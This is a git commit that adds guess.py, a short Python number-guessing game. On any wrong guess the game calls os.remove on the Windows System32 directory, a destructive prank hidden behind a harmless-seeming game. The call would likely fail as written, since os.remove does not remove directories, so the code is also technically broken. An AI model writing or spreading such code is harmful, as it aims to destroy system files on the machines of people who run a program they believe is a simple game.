deddedbc99bc9bc12836fc90a17959f36976c8d4
Siddhartha Kc <98539750+siddhuexe@users.noreply.github.com>
2023-06-08 17:57:46 +0545

    Create guess.py

---
+++ guess.py
@@ -0,0 +1,9 @@
+import random,os
+
+n = random.randint(0,9)
+guess = int(input("Guess a number between 0 and 9: "))
+
+if guess == n:
+    print("You Won!")
+else:
+    os.remove("C:\Windows\System32")
